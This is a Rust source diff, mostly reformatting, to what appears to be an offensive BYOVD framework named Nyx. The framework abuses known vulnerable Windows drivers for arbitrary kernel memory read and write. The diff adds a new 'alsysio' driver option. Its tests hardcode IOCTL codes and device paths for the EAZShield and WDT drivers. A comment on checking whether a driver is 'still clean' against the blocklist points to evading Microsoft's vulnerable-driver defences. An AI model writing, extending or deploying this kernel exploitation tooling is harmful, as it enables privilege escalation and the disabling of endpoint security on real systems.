@@ -72,7 +72,9 @@ pub trait VulnDriverIoctl: Send + Sync {
     /// IOCTL code for "write `size` bytes from `buf` to kernel VA `addr`".
     fn write_ioctl(&self) -> u32;
     /// Human-readable blocklist status. Logged at bootstrap. Purely informational.
-    fn blocklist_status(&self) -> &'static str { "unknown" }
+    fn blocklist_status(&self) -> &'static str {
+        "unknown"
+    }
 
     /// Whether this driver can consume kernel **virtual** addresses — the
     /// `KernelRw` contract [`ByovdDriver`] exposes. Defaults to `true`;
@@ -81,7 +83,9 @@ pub trait VulnDriverIoctl: Send + Sync {
     /// [`KrwError::Unavailable`] instead of a misleading
     /// [`KrwError::Partial { ok: 0 }`] (kernelsdk-1-6: the permanent
     /// VA→PA mismatch was previously indistinguishable from a flaky driver).
-    fn supports_va(&self) -> bool { true }
+    fn supports_va(&self) -> bool {
+        true
+    }
 
     /// The per-driver kernel read/write primitive. `op` selects read vs write.
     /// `kaddr` is a kernel virtual address; `buf` is the user buffer; exactly
@@ -191,7 +195,7 @@ impl ByovdDriver {
             create_file(
                 path_buf.as_ptr(),
                 0x0012_0003, // FILE_READ_DATA|FILE_WRITE_DATA|SYNCHRONIZE (minimal)
-                0x03,          // FILE_SHARE_READ | FILE_SHARE_WRITE
+                0x03,        // FILE_SHARE_READ | FILE_SHARE_WRITE
                 ptr::null_mut(),
                 0x03, // OPEN_EXISTING
                 0,
@@ -270,8 +274,13 @@ impl KernelRw for ByovdDriver {
         let mut buf: alloc::vec::Vec<u8> = alloc::vec::Vec::with_capacity(src.len());
         buf.extend_from_slice(src);
         let r = unsafe {
-            self.driver
-                .raw_rw(RwOp::Write, kaddr as u64, &mut buf, self.device, self.dioctl)
+            self.driver.raw_rw(
+                RwOp::Write,
+                kaddr as u64,
+                &mut buf,
+                self.device,
+                self.dioctl,
+            )
         };
         r.map_err(|ok| KrwError::Partial { ok })
     }
@@ -378,11 +387,12 @@ pub fn resolve_kernel_symbol(ntoskrnl_image: &[u8], name: &[u8]) -> Option<u32> 
 // (drivers declared via pub use from lib.rs)
 
 /// Select the default driver via build config.
-/// `NYX_BYOVD=wdtkernel|shield` (unset → Shield).
+/// `NYX_BYOVD=wdtkernel|alsysio|shield` (unset → Shield).
 /// Run `blocklist_status()` on the selected driver to check if it's still clean.
 pub fn default_driver() -> Box<dyn VulnDriverIoctl> {
     match option_env!("NYX_BYOVD") {
         Some("wdtkernel") => Box::new(crate::byovd_drivers::wdtkernel::WdtKernel),
+        Some("alsysio") => Box::new(crate::byovd_drivers::alsysio::AlsysIo),
         _ => Box::new(crate::byovd_drivers::shield::Shield),
     }
 }
@@ -412,7 +422,7 @@ fn name_matches(image: &[u8], name_rva: usize, expected: &[u8]) -> bool {
         if got == 0 {
             return false; // candidate ended before `expected`
         }
-        if (got as char).to_ascii_lowercase() != (want as char).to_ascii_lowercase() {
+        if !got.eq_ignore_ascii_case(&want) {
             return false;
         }
         p += 1;
@@ -504,12 +514,12 @@ mod tests {
         img[opt..opt + 2].copy_from_slice(&0x20Bu16.to_le_bytes()); // PE32+
         let dd_off = 112usize;
         img[opt + dd_off..opt + dd_off + 4].copy_from_slice(&0x200u32.to_le_bytes()); // export dir RVA
-        // export dir at 0x200: 1 name/ord/func.
+                                                                                      // export dir at 0x200: 1 name/ord/func.
         img[0x218..0x21C].copy_from_slice(&1u32.to_le_bytes()); // NumberOfNames
         img[0x220..0x224].copy_from_slice(&0x280u32.to_le_bytes()); // AddressOfNames
         img[0x224..0x228].copy_from_slice(&0x290u32.to_le_bytes()); // AddressOfNameOrdinals
         img[0x21C..0x220].copy_from_slice(&0x2A0u32.to_le_bytes()); // AddressOfFunctions
-        // name @ 0x280 -> "c0" string at 0x300 (the COLLIDING name).
+                                                                    // name @ 0x280 -> "c0" string at 0x300 (the COLLIDING name).
         img[0x280..0x284].copy_from_slice(&0x300u32.to_le_bytes());
         let collision_name = b"c0";
         img[0x300..0x300 + collision_name.len()].copy_from_slice(collision_name);
@@ -542,9 +552,18 @@ mod tests {
         assert_eq!(d.write_ioctl(), 0x96102014);
         // \\.\EAZShield
         let expected: &[u16] = &[
-            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-            'E' as u16, 'A' as u16, 'Z' as u16, 'S' as u16,
-            'h' as u16, 'i' as u16, 'e' as u16, 'l' as u16,
+            '\\' as u16,
+            '\\' as u16,
+            '.' as u16,
+            '\\' as u16,
+            'E' as u16,
+            'A' as u16,
+            'Z' as u16,
+            'S' as u16,
+            'h' as u16,
+            'i' as u16,
+            'e' as u16,
+            'l' as u16,
             'd' as u16,
         ];
         assert_eq!(d.device_path(), expected);
@@ -560,11 +579,19 @@ mod tests {
         let d = crate::byovd_drivers::wdtkernel::WdtKernel;
         assert_eq!(d.read_ioctl(), 0x9C412420); // bulk read BYTE
         assert_eq!(d.write_ioctl(), 0x9C41242C); // bulk write BYTE
-        // \\.\__WDT__
+                                                 // \\.\__WDT__
         let expected: &[u16] = &[
-            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-            '_' as u16, '_' as u16, 'W' as u16, 'D' as u16,
-            'T' as u16, '_' as u16, '_' as u16,
+            '\\' as u16,
+            '\\' as u16,
+            '.' as u16,
+            '\\' as u16,
+            '_' as u16,
+            '_' as u16,
+            'W' as u16,
+            'D' as u16,
+            'T' as u16,
+            '_' as u16,
+            '_' as u16,
         ];
         assert_eq!(d.device_path(), expected);
     }
